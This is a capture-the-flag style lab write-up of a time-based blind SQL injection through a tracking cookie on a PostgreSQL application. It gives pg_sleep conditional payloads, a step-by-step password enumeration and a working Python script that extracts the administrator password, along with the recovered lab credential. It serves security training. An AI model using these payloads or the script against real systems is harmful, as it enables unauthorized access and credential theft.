This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

---

**Vulnerable parameter** - tracking cookie

**End Goals:**
- Exploit time-based blind SQLi to output the administrator password
- Login as the administrator user

**Analysis:**

1) Confirm that the parameter is vulnerable to SQLi

```php
' || pg_sleep(10)--
```

![[Pasted image 20240903093858.png]]
- In the bottom right corner you can see it took the app 10 seconds to respond.

2) Confirm that the users table exists in the database

```php
' || (select case when (1=0) then pg_sleep(10) else pg_sleep(-1) end)--
```

```php
' || (select case when (username='administrator') then pg_sleep(10) else pg_sleep(-1) end from users)--
```

![[Pasted image 20240903094216.png]]

3) Enumerate the password length

```php
' || (select case when (username='administrator' and LENGTH(password)>20) then pg_sleep(10) else pg_sleep(-1) end from users)--
```

-> length of password is 20 characters

4) Enumerate the administrator password

```php
' || (select case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(10) else pg_sleep(-1) end from users)--
```

- Looking at the response time it looks like `w` is the first character of the password.

![[Pasted image 20240903094744.png]]

- The room reset which is why the first character n longer matches.

==administrator:73zac50oxohbbcbtb618==

---

**Script:**

- ascii function will iterate through all the alphabet, numbers, and special characters, 32/126
- The substring function extracts the character.
- The ascii function converts it to ascii.
- It checks if it's equal to the ascii number 32/126. If it is, it will wait 10 seconds.

```python
#!/usr/bin/python3

import urllib3
import sys
import requests
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'hhtp': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def sqli_pass(s, url):
	password_extracted = ''
	for i in range(1,21): # Pass length
		for j in range(32,126): # Cycle through ascii
			sqli_payload = "' || (select case when (username='administrator' and ascii(substring(password,%s,1))='%s') then pg_sleep(10) else pg_sleep(-1) end from users)--" %(i,j)
			# Using urllib to encode the payload
			sqli_payload_encoded = urllib.parse.quote(sqli_payload)
			cookies = {'TrackingId': 'vTOoWoRRR6T3UkgS' + sqli_payload_encoded, 'session': 'rIueN69mZTqJa494eGWJMR5pwehHzW70' }
			r = s.get(url, cookies=cookies, verify=False, proxies=proxies )
			if int(r.elapsed.total_seconds()) > 9:
				password_extracted += chr(j)
				sys.stdout.write('\r' + password_extracted)
				sys.stdout.flush()
				break # Break out of the for loop and move to the next character
			else:
				sys.stdout.write('\r' + password_extracted + chr(j))
				sys.stdout.flush()
			
def main():
	if len(sys.argv) != 2:
		print('(+) Usage: %s www.example.com' % sys.argv[0])
		sys.exit(-1)
		
	url = sys.argv[1]
	print('(+) Trying to get the admin password...')
	s = requests.Session()
	sqli_pass(s, url)

if __name__ == '__main__':
	main()
```


---

**Completed:** _10:34 2024-09-03_

